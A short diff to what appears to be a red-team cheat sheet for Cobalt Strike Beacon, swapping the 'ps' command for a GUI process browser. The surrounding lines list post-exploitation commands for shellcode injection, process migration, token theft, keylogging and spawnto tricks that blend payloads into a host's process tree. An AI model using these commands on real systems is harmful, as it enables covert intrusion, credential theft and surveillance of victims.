@@ -74,7 +74,7 @@ beacon> upload /local/file.exe  # Upload file from CS client to target
 ## Process Management
 
 ```
-beacon> ps                      # List all processes
+beacon> process_browser         # GUI tab — process list with inject/steal_token/keylog/screenshot per-process options
 beacon> kill <PID>              # Kill a process
 beacon> inject <PID> x64 <listener>   # Inject shellcode into running process
 beacon> migrate <PID>           # Migrate beacon to another process (changes PID)
@@ -145,7 +145,7 @@ adapting to specific host environments after checking `ps` output.
 
 ```
 1. Get beacon callback
-2. beacon> ps                          — review running processes on that host
+2. beacon> process_browser             — GUI process list for that host (inject/steal_token/keylog from right-click menu)
 3. beacon> spawnto x64 <process>       — pick something already in the process list
 4. beacon> spawnto                     — verify it changed
 5. Now run post-ex commands — sacrificial procs blend into existing process tree
